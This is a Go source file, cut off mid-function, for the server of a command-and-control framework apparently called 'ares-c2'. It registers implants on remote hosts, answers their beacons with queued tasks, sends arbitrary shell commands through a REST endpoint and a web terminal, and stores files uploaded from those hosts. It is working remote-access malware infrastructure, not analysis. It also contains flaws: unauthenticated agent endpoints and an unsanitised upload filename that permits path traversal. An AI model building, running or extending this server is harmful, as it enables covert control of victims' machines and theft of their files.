package main

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
	"golang.org/x/crypto/bcrypt"
	"gorm.io/driver/postgres"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

//go:embed frontend/build/*
var frontendFS embed.FS

type Config struct {
	Server struct {
		Host          string `yaml:"host"`
		Port          int    `yaml:"port"`
		EnableTLS     bool   `yaml:"enable_tls"`
		TLSCertPath   string `yaml:"tls_cert_path"`
		TLSKeyPath    string `yaml:"tls_key_path"`
		SessionSecret string `yaml:"session_secret"`
		UploadDir     string `yaml:"upload_dir"`
		MaxUploadSize int64  `yaml:"max_upload_size"`
	} `yaml:"server"`

	Database struct {
		Host string `yaml:"host"`
		Port int    `yaml:"port"`
		Name string `yaml:"name"`
		User string `yaml:"user"`
		Pass string `yaml:"password"`
	} `yaml:"database"`

	Security struct {
		JWTSecret      string   `yaml:"jwt_secret"`
		APIKey         string   `yaml:"api_key"`
		AdminUsername  string   `yaml:"admin_username"`
		AdminPassword  string   `yaml:"admin_password"`
		AllowedOrigins []string `yaml:"allowed_origins"`
	} `yaml:"security"`
}

var (
	config        Config
	db            *gorm.DB
	logger        *logrus.Logger
	hub           *Hub
	serverStarted time.Time
)

type User struct {
	ID           uint      `gorm:"primaryKey" json:"id"`
	Username     string    `gorm:"uniqueIndex;size:50" json:"username"`
	PasswordHash string    `json:"-"`
	Email        string    `json:"email"`
	Role         string    `gorm:"default:'operator'" json:"role"`
	IsActive     bool      `gorm:"default:true" json:"is_active"`
	CreatedAt    time.Time `json:"created_at"`
	UpdatedAt    time.Time `json:"updated_at"`
}

type Agent struct {
	ID            uint      `gorm:"primaryKey" json:"id"`
	UUID          string    `gorm:"uniqueIndex;size:36" json:"uuid"`
	Hostname      string    `json:"hostname"`
	Username      string    `json:"username"`
	OS            string    `json:"os"`
	Arch          string    `json:"arch"`
	IPAddress     string    `json:"ip_address"`
	ProcessID     int       `json:"process_id"`
	SleepInterval int       `json:"sleep_interval"`
	Jitter        int       `json:"jitter"`
	Status        string    `gorm:"default:'offline'" json:"status"`
	LastSeen      time.Time `json:"last_seen"`
	CreatedAt     time.Time `json:"created_at"`
	Metadata      string    `json:"metadata"` // JSON string
}

type Task struct {
	ID          uint      `gorm:"primaryKey" json:"id"`
	AgentID     uint      `json:"agent_id"`
	Agent       Agent     `gorm:"foreignKey:AgentID" json:"agent,omitempty"`
	Command     string    `json:"command"`
	Arguments   string    `json:"arguments"`
	Status      string    `gorm:"default:'pending'" json:"status"`
	Output      string    `json:"output"`
	Error       string    `json:"error"`
	CreatedBy   string    `json:"created_by"`
	CreatedAt   time.Time `json:"created_at"`
	StartedAt   time.Time `json:"started_at"`
	CompletedAt time.Time `json:"completed_at"`
	Priority    int       `gorm:"default:0" json:"priority"`
}

type File struct {
	ID             uint      `gorm:"primaryKey" json:"id"`
	AgentID        uint      `json:"agent_id"`
	Agent          Agent     `gorm:"foreignKey:AgentID" json:"agent,omitempty"`
	Filename       string    `json:"filename"`
	FilePath       string    `json:"file_path"`
	FileSize       int64     `json:"file_size"`
	MD5Hash        string    `json:"md5_hash"`
	UploadedAt     time.Time `json:"uploaded_at"`
	IsDownloadable bool      `gorm:"default:true" json:"is_downloadable"`
}

type Setting struct {
	Key       string    `gorm:"primaryKey;size:100" json:"key"`
	Value     string    `json:"value"`
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
}

type APIKey struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	Name      string    `gorm:"size:100" json:"name"`
	Key       string    `gorm:"uniqueIndex;size:64" json:"key"`
	CreatedAt time.Time `json:"created_at"`
}

type Webhook struct {
	ID        uint      `gorm:"primaryKey" json:"id"`
	Name      string    `gorm:"size:100" json:"name"`
	URL       string    `gorm:"size:255" json:"url"`
	Enabled   bool      `json:"enabled"`
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
}

type WebSocketMessage struct {
	Type    string          `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

type TerminalMessage struct {
	Type      string `json:"type"`
	Command   string `json:"command,omitempty"`
	Timestamp int64  `json:"timestamp,omitempty"`
}

type Hub struct {
	clients    map[*Client]bool
	broadcast  chan []byte
	register   chan *Client
	unregister chan *Client
	mu         sync.RWMutex
}

type Client struct {
	hub    *Hub
	conn   *websocket.Conn
	send   chan []byte
	userID uint
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		for _, allowed := range config.Security.AllowedOrigins {
			if origin == allowed {
				return true
			}
		}
		return origin == "" // Allow empty origin for local testing
	},
}

type authTokenPayload struct {
	UserID uint   `json:"user_id"`
	Iss    string `json:"iss"`
	Aud    string `json:"aud"`
	Sub    string `json:"sub"`
	Exp    int64  `json:"exp"`
	Iat    int64  `json:"iat"`
}

type contextKey string

const authUserIDKey contextKey = "authUserID"

func NewHub() *Hub {
	return &Hub{
		broadcast:  make(chan []byte),
		register:   make(chan *Client),
		unregister: make(chan *Client),
		clients:    make(map[*Client]bool),
	}
}

func (h *Hub) Run() {
	for {
		select {
		case client := <-h.register:
			h.mu.Lock()
			h.clients[client] = true
			h.mu.Unlock()

		case client := <-h.unregister:
			h.mu.Lock()
			if _, ok := h.clients[client]; ok {
				delete(h.clients, client)
				close(client.send)
			}
			h.mu.Unlock()

		case message := <-h.broadcast:
			h.mu.RLock()
			for client := range h.clients {
				select {
				case client.send <- message:
				default:
					close(client.send)
					delete(h.clients, client)
				}
			}
			h.mu.RUnlock()
		}
	}
}

func (c *Client) readPump() {
	defer func() {
		c.hub.unregister <- c
		c.conn.Close()
	}()

	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Printf("WebSocket error: %v", err)
			}
			break
		}

		var wsMsg WebSocketMessage
		if err := json.Unmarshal(message, &wsMsg); err != nil {
			logger.Printf("Failed to parse WebSocket message: %v", err)
			continue
		}

		// Handle different message types
		switch wsMsg.Type {
		case "ping":
			c.send <- []byte(`{"type":"pong"}`)
		case "subscribe_agent":
			// Subscribe to agent updates
		case "unsubscribe_agent":
			// Unsubscribe from agent updates
		}
	}
}

func (c *Client) writePump() {
	defer func() {
		c.conn.Close()
	}()

	for {
		select {
		case message, ok := <-c.send:
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			w, err := c.conn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)

			n := len(c.send)
			for i := 0; i < n; i++ {
				w.Write([]byte{'\n'})
				w.Write(<-c.send)
			}

			if err := w.Close(); err != nil {
				return
			}
		}
	}
}

func serveWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Printf("Failed to upgrade WebSocket: %v", err)
		return
	}

	token := r.URL.Query().Get("token")
	userID, err := validateToken(token)
	if err != nil {
		conn.WriteMessage(websocket.CloseMessage, []byte(`{"error":"invalid token"}`))
		conn.Close()
		return
	}

	client := &Client{
		hub:    hub,
		conn:   conn,
		send:   make(chan []byte, 256),
		userID: userID,
	}

	hub.register <- client

	go client.writePump()
	go client.readPump()
}

func serveTerminalWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Printf("Failed to upgrade terminal WebSocket: %v", err)
		return
	}
	defer conn.Close()

	token := r.URL.Query().Get("token")
	userID, err := validateToken(token)
	if err != nil {
		conn.WriteMessage(websocket.CloseMessage, []byte(`{"error":"invalid token"}`))
		return
	}

	agentID := mux.Vars(r)["id"]
	if agentID == "" {
		conn.WriteJSON(map[string]string{"type": "terminal_error", "error": "Missing agent id"})
		return
	}

	agent, err := findAgentByIdentifier(agentID)
	if err != nil {
		conn.WriteJSON(map[string]string{"type": "terminal_error", "error": "Agent not found"})
		return
	}

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		var terminalMessage TerminalMessage
		if err := json.Unmarshal(message, &terminalMessage); err != nil {
			conn.WriteJSON(map[string]string{"type": "terminal_error", "error": "Invalid message"})
			continue
		}

		if terminalMessage.Type != "terminal_command" {
			continue
		}

		if strings.TrimSpace(terminalMessage.Command) == "" {
			conn.WriteJSON(map[string]string{"type": "terminal_error", "error": "Missing command"})
			continue
		}

		createdBy := fmt.Sprintf("user:%d", userID)
		var user User
		if err := db.First(&user, userID).Error; err == nil && user.Username != "" {
			createdBy = user.Username
		}

		task := Task{
			AgentID:   agent.ID,
			Command:   "cmd",
			Arguments: terminalMessage.Command,
			Status:    "pending",
			CreatedBy: createdBy,
			Priority:  50,
			CreatedAt: time.Now(),
		}

		if err := db.Create(&task).Error; err != nil {
			conn.WriteJSON(map[string]string{"type": "terminal_error", "error": "Failed to queue command"})
			continue
		}

		conn.WriteJSON(map[string]string{
			"type":   "terminal_output",
			"output": fmt.Sprintf("Queued command %q (task %d)\n", terminalMessage.Command, task.ID),
		})
		conn.WriteJSON(map[string]string{"type": "terminal_complete"})
		conn.WriteJSON(map[string]string{"type": "terminal_prompt"})
	}
}

func validateToken(token string) (uint, error) {
	if token == "" {
		return 0, fmt.Errorf("missing token")
	}
	if config.Security.JWTSecret == "" {
		return 0, fmt.Errorf("missing jwt secret")
	}

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return 0, fmt.Errorf("invalid token format")
	}

	mac := hmac.New(sha256.New, []byte(config.Security.JWTSecret))
	mac.Write([]byte(parts[0] + "." + parts[1]))
	expectedSignature := mac.Sum(nil)
	signatureBytes, err := base64.RawURLEncoding.DecodeString(parts[2])
	if err != nil || !hmac.Equal(signatureBytes, expectedSignature) {
		return 0, fmt.Errorf("invalid token signature")
	}

	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return 0, fmt.Errorf("invalid token payload")
	}

	var payload authTokenPayload
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return 0, fmt.Errorf("invalid token payload")
	}
	if payload.Iss != "ares-c2" {
		return 0, fmt.Errorf("invalid issuer")
	}
	if payload.Aud != "ares-c2-ui" {
		return 0, fmt.Errorf("invalid audience")
	}
	if payload.Exp > 0 && time.Now().Unix() > payload.Exp {
		return 0, fmt.Errorf("token expired")
	}
	if payload.UserID == 0 {
		return 0, fmt.Errorf("invalid user id")
	}

	return payload.UserID, nil
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	var creds struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var user User
	result := db.Where("username = ? AND is_active = true", creds.Username).First(&user)
	if result.Error != nil {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(creds.Password)); err != nil {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}

	// Generate JWT token
	token, err := generateToken(user)
	if err != nil {
		http.Error(w, "Failed to generate token", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"token": token,
		"user":  user,
	})
}

func handleLogout(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]string{"status": "logged_out"})
}

func generateToken(user User) (string, error) {
	if config.Security.JWTSecret == "" {
		return "", fmt.Errorf("missing jwt secret")
	}
	now := time.Now()
	headerBytes, err := json.Marshal(map[string]string{
		"alg": "HS256",
		"typ": "JWT",
	})
	if err != nil {
		return "", err
	}

	payload := authTokenPayload{
		UserID: user.ID,
		Iss:    "ares-c2",
		Aud:    "ares-c2-ui",
		Sub:    fmt.Sprintf("%d", user.ID),
		Iat:    now.Unix(),
		Exp:    now.Add(24 * time.Hour).Unix(),
	}
	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	headerEncoded := base64.RawURLEncoding.EncodeToString(headerBytes)
	payloadEncoded := base64.RawURLEncoding.EncodeToString(payloadBytes)
	unsignedToken := headerEncoded + "." + payloadEncoded

	mac := hmac.New(sha256.New, []byte(config.Security.JWTSecret))
	mac.Write([]byte(unsignedToken))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return unsignedToken + "." + signature, nil
}

func handleAgentRegister(w http.ResponseWriter, r *http.Request) {
	var agentData struct {
		UUID          string `json:"uuid"`
		Hostname      string `json:"hostname"`
		Username      string `json:"username"`
		OS            string `json:"os"`
		Arch          string `json:"arch"`
		IPAddress     string `json:"ip_address"`
		SleepInterval int    `json:"sleep_interval"`
	}

	if err := json.NewDecoder(r.Body).Decode(&agentData); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Check if agent already exists
	var agent Agent
	result := db.Where("uuid = ?", agentData.UUID).First(&agent)

	if result.Error == gorm.ErrRecordNotFound {
		// Create new agent
		agent = Agent{
			UUID:          agentData.UUID,
			Hostname:      agentData.Hostname,
			Username:      agentData.Username,
			OS:            agentData.OS,
			Arch:          agentData.Arch,
			IPAddress:     agentData.IPAddress,
			SleepInterval: agentData.SleepInterval,
			Status:        "online",
			LastSeen:      time.Now(),
		}
		db.Create(&agent)
	} else {
		// Update existing agent
		agent.Status = "online"
		agent.LastSeen = time.Now()
		db.Save(&agent)
	}

	// Broadcast agent connection
	hub.broadcast <- []byte(fmt.Sprintf(`{"type":"agent_connected","payload":{"uuid":"%s","hostname":"%s"}}`, agent.UUID, agent.Hostname))

	// Return pending tasks
	var pendingTasks []Task
	db.Where("agent_id = ? AND status = 'pending'", agent.ID).Find(&pendingTasks)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":   "registered",
		"agent_id": agent.ID,
		"tasks":    pendingTasks,
	})
}

func handleAgentBeacon(w http.ResponseWriter, r *http.Request) {
	agentUUID := r.URL.Query().Get("uuid")
	if agentUUID == "" {
		http.Error(w, "Missing agent UUID", http.StatusBadRequest)
		return
	}

	var agent Agent
	result := db.Where("uuid = ?", agentUUID).First(&agent)
	if result.Error != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	// Update last seen
	agent.LastSeen = time.Now()
	agent.Status = "online"
	db.Save(&agent)

	// Get pending tasks
	var tasks []Task
	db.Where("agent_id = ? AND status = 'pending'", agent.ID).Find(&tasks)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks": tasks,
		"sleep": agent.SleepInterval,
	})
}

func handleTaskResult(w http.ResponseWriter, r *http.Request) {
	var result struct {
		TaskID string `json:"task_id"`
		Output string `json:"output"`
		Error  string `json:"error"`
		Status string `json:"status"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var task Task
	db.First(&task, result.TaskID)

	task.Status = result.Status
	task.Output = result.Output
	task.Error = result.Error
	task.CompletedAt = time.Now()
	db.Save(&task)

	// Broadcast task completion
	hub.broadcast <- []byte(fmt.Sprintf(`{"type":"task_completed","payload":{"task_id":%d,"agent_id":%d}}`, task.ID, task.AgentID))

	w.WriteHeader(http.StatusOK)
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	// Parse multipart form
	r.ParseMultipartForm(config.Server.MaxUploadSize)

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	agentIdentifier := r.FormValue("agent_id")
	if agentIdentifier == "" {
		http.Error(w, "Missing agent ID", http.StatusBadRequest)
		return
	}
	agent, err := findAgentByIdentifier(agentIdentifier)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}
	filename := handler.Filename

	// Create upload directory if it doesn't exist
	uploadDir := fmt.Sprintf("%s/%d", config.Server.UploadDir, agent.ID)
	os.MkdirAll(uploadDir, 0755)

	// Create file on disk
	filePath := fmt.Sprintf("%s/%s", uploadDir, filename)
	dst, err := os.Create(filePath)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// Copy file
	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	// Create database record
	fileRecord := File{
		AgentID:    agent.ID,
		Filename:   filename,
		FilePath:   filePath,
		FileSize:   handler.Size,
		UploadedAt: time.Now(),
	}
	db.Create(&fileRecord)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":       fileRecord.ID,
		"filename": filename,
		"size":     handler.Size,
	})
}

func handleListAgents(w http.ResponseWriter, r *http.Request) {
	query := db.Model(&Agent{})
	if status := r.URL.Query().Get("status"); status != "" {
		query = query.Where("status = ?", status)
	}
	if search := r.URL.Query().Get("search"); search != "" {
		like := "%" + search + "%"
		query = query.Where("hostname ILIKE ? OR username ILIKE ? OR uuid ILIKE ?", like, like, like)
	}

	page, pageSize, hasPagination, err := parsePaginationParams(r)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	var agents []Agent
	if hasPagination {
		var total int64
		if err := query.Count(&total).Error; err != nil {
			http.Error(w, "Failed to list agents", http.StatusInternalServerError)
			return
		}

		if err := query.Order("id asc").Limit(pageSize).Offset((page - 1) * pageSize).Find(&agents).Error; err != nil {
			http.Error(w, "Failed to list agents", http.StatusInternalServerError)
			return
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"items":     agents,
			"page":      page,
			"page_size": pageSize,
			"total":     total,
		})
		return
	}

	if err := query.Order("id asc").Find(&agents).Error; err != nil {
		http.Error(w, "Failed to list agents", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(agents)
}

func handleGetAgent(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(agent)
}

func handleAgentTasks(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	var tasks []Task
	if err := db.Where("agent_id = ?", agent.ID).Order("created_at desc").Find(&tasks).Error; err != nil {
		http.Error(w, "Failed to fetch tasks", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(tasks)
}

func handleCreateTask(w http.ResponseWriter, r *http.Request) {
	var payload struct {
		AgentID   string `json:"agent_id"`
		Command   string `json:"command"`
		Arguments string `json:"arguments"`
		Priority  int    `json:"priority"`
	}

	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if payload.AgentID == "" || payload.Command == "" {
		http.Error(w, "Missing required fields", http.StatusBadRequest)
		return
	}

	userID, ok := r.Context().Value(authUserIDKey).(uint)
	if !ok || userID == 0 {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	createdBy := fmt.Sprintf("user:%d", userID)
	var user User
	if err := db.First(&user, userID).Error; err == nil && user.Username != "" {
		createdBy = user.Username
	}

	agent, err := findAgentByIdentifier(payload.AgentID)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	task := Task{
		AgentID:   agent.ID,
		Command:   payload.Command,
		Arguments: payload.Arguments,
		Status:    "pending",
		CreatedBy: createdBy,
		Priority:  payload.Priority,
		CreatedAt: time.Now(),
	}

	if err := db.Create(&task).Error; err != nil {
		http.Error(w, "Failed to create task", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(task)
}

func handleGetTask(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing task id", http.StatusBadRequest)
		return
	}

	var task Task
	if err := db.First(&task, id).Error; err != nil {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(task)
}

func handleExecuteCommand(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	var payload struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	if payload.Command == "" {
		http.Error(w, "Missing command", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	userID, ok := r.Context().Value(authUserIDKey).(uint)
	if !ok || userID == 0 {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	createdBy := fmt.Sprintf("user:%d", userID)
	var user User
	if err := db.First(&user, userID).Error; err == nil && user.Username != "" {
		createdBy = user.Username
	}

	task := Task{
		AgentID:   agent.ID,
		Command:   "cmd",
		Arguments: payload.Command,
		Status:    "pending",
		CreatedBy: createdBy,
		Priority:  50,
		CreatedAt: time.Now(),
	}

	if err := db.Create(&task).Error; err != nil {
		http.Error(w, "Failed to create task", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(task)
}

func handleShellInfo(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	var lastTask Task
	taskResult := db.Where("agent_id = ? AND command = ?", agent.ID, "cmd").Order("created_at desc").First(&lastTask)
	response := map[string]interface{}{
		"agent_id": agent.ID,
		"uuid":     agent.UUID,
		"status":   agent.Status,
	}
	if taskResult.Error == nil {
		response["last_command"] = lastTask.Arguments
		response["last_status"] = lastTask.Status
		response["last_output"] = lastTask.Output
		response["last_error"] = lastTask.Error
		response["last_completed_at"] = lastTask.CompletedAt
	} else {
		response["message"] = "No shell tasks recorded yet"
	}

	json.NewEncoder(w).Encode(response)
}

func handleCancelTask(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing task id", http.StatusBadRequest)
		return
	}

	var task Task
	if err := db.First(&task, id).Error; err != nil {
		http.Error(w, "Task not found", http.StatusNotFound)
		return
	}

	task.Status = "cancelled"
	task.CompletedAt = time.Now()
	if err := db.Save(&task).Error; err != nil {
		http.Error(w, "Failed to cancel task", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(task)
}

func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing file id", http.StatusBadRequest)
		return
	}

	var fileRecord File
	if err := db.First(&fileRecord, id).Error; err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	if !fileRecord.IsDownloadable {
		http.Error(w, "File not available", http.StatusForbidden)
		return
	}

	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", fileRecord.Filename))
	http.ServeFile(w, r, fileRecord.FilePath)
}

func handleListTasks(w http.ResponseWriter, r *http.Request) {
	query := db.Model(&Task{})
	if agentID := r.URL.Query().Get("agent_id"); agentID != "" {
		agent, err := findAgentByIdentifier(agentID)
		if err != nil {
			http.Error(w, "Agent not found", http.StatusNotFound)
			return
		}
		query = query.Where("agent_id = ?", agent.ID)
	}
	if status := r.URL.Query().Get("status"); status != "" {
		query = query.Where("status = ?", status)
	}
	if search := r.URL.Query().Get("search"); search != "" {
		like := "%" + search + "%"
		query = query.Where("command ILIKE ? OR arguments ILIKE ?", like, like)
	}

	var tasks []Task
	page, pageSize, hasPagination, err := parsePaginationParams(r)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	if hasPagination {
		var total int64
		if err := query.Count(&total).Error; err != nil {
			http.Error(w, "Failed to list tasks", http.StatusInternalServerError)
			return
		}

		if err := query.Order("created_at desc").Limit(pageSize).Offset((page - 1) * pageSize).Find(&tasks).Error; err != nil {
			http.Error(w, "Failed to list tasks", http.StatusInternalServerError)
			return
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"items":     tasks,
			"page":      page,
			"page_size": pageSize,
			"total":     total,
		})
		return
	}

	if err := query.Order("created_at desc").Find(&tasks).Error; err != nil {
		http.Error(w, "Failed to list tasks", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(tasks)
}

func handleListAgentFiles(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	var files []File
	if err := db.Where("agent_id = ?", agent.ID).Order("uploaded_at desc").Find(&files).Error; err != nil {
		http.Error(w, "Failed to fetch files", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(files)
}

func handleDeleteAgent(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := findAgentByIdentifier(id)
	if err != nil {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	db.Where("agent_id = ?", agent.ID).Delete(&Task{})
	db.Where("agent_id = ?", agent.ID).Delete(&File{})
	if err := db.Delete(&agent).Error; err != nil {
		http.Error(w, "Failed to delete agent", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusNoContent)
}

func handleDeleteFile(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if id == "" {
		http.Error(w, "Missing file id", http.StatusBadRequest)
		return
	}

	var fileRecord File
	if err := db.First(&fileRecord, id).Error; err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}

	if err := db.Delete(&fileRecord).Error; err != nil {
		http.Error(w, "Failed to delete file", http.StatusInternalServerError)
		return
	}

	if fileRecord.FilePath != "" {
		_ = os.Remove(fileRecord.FilePath)
	}

	w.WriteHeader(http.StatusNoContent)
}

func buildSystemInfo() map[string]interface{} {
	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	uptime := time.Since(serverStarted).Seconds()
	return map[string]interface{}{
		"uptime": uptime,
		"memory": map[string]uint64{
			"used":  memStats.Alloc,
			"total": memStats.Sys,
		},
		"cpu": 0,
	}
}

func handleSystemInfo(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(buildSystemInfo())
}

func handleActivity(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode([]interface{}{})
}

func loadSettingsMap() (map[string]interface{}, error) {
	var settings []Setting
	if err := db.Find(&settings).Error; err != nil {
		return nil, err
	}

	result := make(map[string]interface{}, len(settings))
	for _, setting := range settings {
		var value interface{}
		if err := json.Unmarshal([]byte(setting.Value), &value); err != nil {
			result[setting.Key] = setting.Value
			continue
		}
		result[setting.Key] = value
	}
	return result, nil
}

func upsertSettingValue(key string, value interface{}) error {
	valueBytes, err := json.Marshal(value)
	if err != nil {
		return err
	}

	setting := Setting{
		Key:   key,
		Value: string(valueBytes),
	}

	return db.Clauses(clause.OnConflict{
		Columns:   []clause.Column{{Name: "key"}},
		DoUpdates: clause.AssignmentColumns([]string{"value", "updated_at"}),
	}).Create(&setting).Error
}

func parsePaginationParams(r *http.Request) (int, int, bool, error) {
	query := r.URL.Query()
	pageStr := query.Get("page")
	sizeStr := query.Get("page_size")
	if pageStr == "" && sizeStr == "" {
		return 0, 0, false, nil
	}

	page := 1
	if pageStr != "" {
		parsed, err := strconv.Atoi(pageStr)
		if err != nil || parsed < 1 {
			return 0, 0, true, fmt.Errorf("invalid page")
		}
		page = parsed
	}

	pageSize := 50
	if sizeStr != "" {
		parsed, err := strconv.Atoi(sizeStr)
		if err != nil || parsed < 1 {
			return 0, 0, true, fmt.Errorf("invalid page size")
		}
		pageSize = parsed
	}

	if pageSize > 200 {
		pageSize = 200
	}

	return page, pageSize, true, nil
}

func handleGetSettings(w http.ResponseWriter, r *http.Request) {
	settingsMap, err := loadSettingsMap()
	if err != nil {
		http.Error(w, "Failed to load settings", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(settingsMap)
}

func handleUpdateSettings(w http.ResponseWriter, r *http.Request) {
	var payload map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	for key, value := range payload {
		if err := upsertSettingValue(key, value); err != nil {
			http.Error(w, "Failed to update settings", http.StatusInternalServerError)
			return
		}
	}

	settingsMap, err := loadSettingsMap()
	if err != nil {
		http.Error(w, "Failed to load settings", http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(settingsMap)
}

func handleListAPIKeys(w http.ResponseWriter, r *http.Request) {
	var keys []APIKey
	if err := db.Order("id asc").Find(&keys).Error; err != nil {
		http.Error(w, "Failed to load api keys", http.StatusInternalServerError)
		return
	}
	json.NewEncoder(w).Encode(keys)
}

func handleCreateAPIKey(w http.ResponseWriter, r *http.Request) {
	var payload struct {
